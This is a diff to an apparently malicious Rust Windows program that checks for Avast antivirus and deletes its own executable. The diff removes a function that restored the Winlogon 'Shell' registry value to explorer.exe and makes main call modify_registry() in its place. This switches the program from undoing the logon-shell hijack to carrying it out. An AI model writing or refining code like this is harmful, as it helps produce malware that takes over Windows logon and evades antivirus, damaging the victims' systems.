@@ -6,7 +6,6 @@ use winreg::enums::*;
 use winreg::RegKey;
 use std::fs;
 use std::env;
-use std::ffi::OsString;
 use std::time::Duration;
 use std::thread::sleep;
 
@@ -311,37 +310,6 @@ fn check_avast_installed() -> bool {
     avast_service_running
 }
 
-fn modify_registry_revert() -> io::Result<()> {
-    // Define the path to the directory and the marker file
-    let dir_path = r"C:\Program Files\utkudrk2";
-    let txt_file_path = Path::new(dir_path).join("execution_marker.txt");
-
-    // Open the registry key for Winlogon
-    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-    let winlogon_key = hkcu.open_subkey_with_flags(
-        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
-        KEY_SET_VALUE,
-    )?;
-
-    // Delete the existing "Shell" value if it exists
-    match winlogon_key.delete_value("Shell") {
-        Ok(_) => println!("Existing Shell value deleted (reverting)."),
-        Err(e) => eprintln!("Failed to delete Shell value (reverting): {}", e),
-    }
-
-    // Set the "Shell" value back to explorer.exe
-    winlogon_key.set_value("Shell", &OsString::from("explorer.exe"))?;
-    println!("Registry reverted: Shell set to explorer.exe");
-
-    // Optionally, delete the marker file after reverting
-    if txt_file_path.exists() {
-        fs::remove_file(txt_file_path)?;
-        println!("Execution marker deleted.");
-    }
-
-    Ok(())
-}
-
 fn self_delete() -> io::Result<()> {
     // Get the path of the current executable
     if let Ok(exe_path) = env::current_exe() {
@@ -441,7 +409,7 @@ fn main() {
             return;
         }
 
-        if let Err(e) = modify_registry_revert() {
+        if let Err(e) = modify_registry() {
             eprintln!("Error modifying the registry: {}", e);
         }
 
